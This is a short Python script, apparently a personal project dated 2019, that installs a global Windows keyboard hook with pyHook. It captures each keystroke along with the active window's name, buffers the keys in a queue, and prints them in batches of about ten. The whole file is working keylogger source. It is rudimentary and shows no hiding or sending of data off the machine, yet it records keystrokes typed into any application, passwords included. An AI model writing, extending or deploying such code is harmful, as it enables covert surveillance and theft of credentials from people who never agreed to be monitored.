'''
    Autor: @SergioRAlvarezP
    Fecha de Inicio: 2019-05-21
    Fecha de término: 2019-06-26
'''
from collections import deque
import pyHook, pythoncom, sys, logging
import time, datetime

i=0

class Queue(object):
    def __init__(self):
        self.items=deque()
    
    def qpush(self,x):
        self.items.appendleft(x)

    def qshow(self):
        print(self.items)

    def qempty(self):
        if len(self.items)==0:
            return True
        else:
            return False

    def qpop(self):
        if self.qempty():
            return None
        else:
            return self.items.pop()
    
    def qlen(self):
        return len(self.items)

def OnKeyboardEvent(event):
    string = ""
    element = [event.MessageName,event.Message,event.Time,event.Window,event.WindowName,event.Ascii,event.Key,event.KeyID,event.ScanCode,event.Extended,event.Injected,event.Alt,event.Transition]
    elements.qpush(element)

    if elements.qlen() > 10:
        i=elements.qlen()
        while i>0:
            value = elements.qpop()
            item = value[6]
            string = string + item
            i-=1
        print ('########################',string)
    return True

elements = Queue()
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()